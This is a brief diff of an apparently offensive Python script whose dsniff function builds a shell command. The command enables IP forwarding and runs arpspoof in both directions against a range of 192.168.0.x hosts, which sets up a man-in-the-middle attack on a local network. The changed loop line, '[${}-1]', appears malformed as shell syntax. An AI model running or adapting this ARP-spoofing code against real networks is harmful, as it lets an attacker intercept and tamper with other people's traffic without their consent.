@@ -51,7 +51,7 @@ def mitmf():
 def dsniff():
 	cmd = """
 	echo 1 > /proc/sys/net/ipv4/ip_forward ;
-	for x in $(seq {} {}) ;
+	for x in $(seq {} [${}-1]) ;
 	do
 		arpspoof -t {} 192.168.0.$x > /dev/null 2> /dev/null & ;
 		arpspoof -t 192.168.0.$x {} > /dev/null 2> /dev/null & ;
